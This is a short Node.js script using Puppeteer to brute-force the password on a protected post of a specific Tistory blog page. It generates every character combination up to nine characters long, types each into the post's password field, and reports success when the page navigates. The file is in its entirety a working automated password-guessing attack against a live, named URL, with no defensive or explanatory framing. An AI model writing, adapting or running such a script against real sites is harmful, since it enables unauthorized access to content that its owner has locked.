const puppeteer = require('puppeteer');

const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+[]{}|;:,.<>?';

function generateCombinations(length) {
    const combinations = [];
    const maxCombinations = Math.pow(chars.length, length);

    for (let i = 0; i < maxCombinations; i++) {
        let combination = '';
        let num = i;

        for (let j = 0; j < length; j++) {
            combination = chars[num % chars.length] + combination;
            num = Math.floor(num / chars.length);
        }

        combinations.push(combination);
    }

    return combinations;
}

(async () => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  await page.goto('https://neck392.tistory.com/64', { waitUntil: 'networkidle2' });

  for (let length = 1; length <= 9; length++) {
    console.log(`\nCombination length: ${length}`);
    const generatedCombinations = generateCombinations(length);

    for (const password of generatedCombinations) {
      console.log('Trying password:', password);

      await page.type('input[name="entry64password"]', password);
      await page.click('button[type="submit"]');

      try {
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 3000 });
        console.log('Correct password found:', password);
        console.log('Password:', password);
        await browser.close();
        return;
      } catch {
        console.log('Incorrect password:', password);
        await page.evaluate(() => document.querySelector('input[name="entry64password"]').value = '');
      }
    }
  }

  console.log('All combinations tried, but no password was found.');
  await browser.close();
})();
